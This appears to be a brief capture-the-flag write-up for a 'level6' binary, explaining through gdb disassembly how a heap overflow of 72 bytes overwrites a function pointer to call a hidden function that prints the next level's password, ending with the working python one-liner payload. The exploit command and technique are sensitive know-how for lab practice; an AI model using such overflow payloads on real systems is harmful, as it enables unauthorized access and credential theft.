Soooooooooooooo, by looking at layout in gdb we can see there's `n` and `m` function that exist by are not called in the main part.

`m` function calls puts, witch we can abuse and `n` calls `system("/bin/cat /home/user/level7/.pass")`.

Now we just need to somewhat exploit the main function to call `m` to overflow to call `n` ?

in the main function:
```
   0x08048485 <+9>:     movl   $0x40,(%esp)
```

This means 0x40 (64) bit will me malloc and the binary will copy whatever we but in argv[1].

It will eventually segfault at 72 char in argv[1]. So we can maybe strait up exploit this segfault to call `n` ?

72 * 'a' + '\x54\x84\x04\x08'

`./level6 $(python -c "print('a' * 72 + '\x54\x84\x04\x08')")`